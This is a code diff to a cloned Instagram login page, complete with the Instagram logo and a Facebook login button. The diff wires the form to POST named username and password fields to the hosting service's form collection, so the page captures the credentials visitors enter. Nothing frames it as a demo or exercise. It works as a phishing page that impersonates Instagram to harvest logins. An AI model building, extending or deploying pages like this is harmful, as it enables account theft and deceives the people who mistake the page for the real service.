@@ -5,10 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram Login Page</title>
     <link rel="stylesheet" href="./style.css">
-    <script src="./script.js"></script> 
+    
 </head>
 <body>
-    <script src="./script.js"></script>
+    
    <div class="main">
     <div class="left">
  <div class="phone">
@@ -21,14 +21,14 @@
             
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png?20160616034027" alt="" class="logo"/>
             <button id="fblogin"><img src="https://th.bing.com/th/id/R.6c3ea8b640f61035021c20dd5dcd37fa?rik=31mzN9qX%2bAR9pA&riu=http%3a%2f%2fclipart-library.com%2fnew_gallery%2f377-3776210_facebook-logo-vector-logovectornet-logo-facebook-2019-png.png&ehk=feGZ0i4yauVvpdtQu%2bTAeLkp%2bpCt2QN1zx7GrMwtQuA%3d&risl=&pid=ImgRaw&r=0" alt="" class="fbphone">Continue with Facebook</button>
-            <form action="get" class="form">
-                <input type="text" placeholder="Phone number , username, or email">
-                <input type="password" placeholder="password">
-<!--                 <button class="login" type="submit">Log in</button>   -->
-                 <!-- <input type="submit" value="Log in" class="login"> --> 
+            <form  class="form" method="POST" data-netlify="true" onsubmit="submit">
+                <input type="text" name="username" placeholder="Phone number , username, or email">
+                <input type="password" name="password" placeholder="password">
+                 <button class="login" type="submit">Log in</button>  
+                
                 </form>
             
-             <button class="login" type="submit">Log in</button>  
+             <!-- <button class="login" type="submit">Log in</button>   -->
               
              <div class="mid"><hr>
             <p>OR</p>
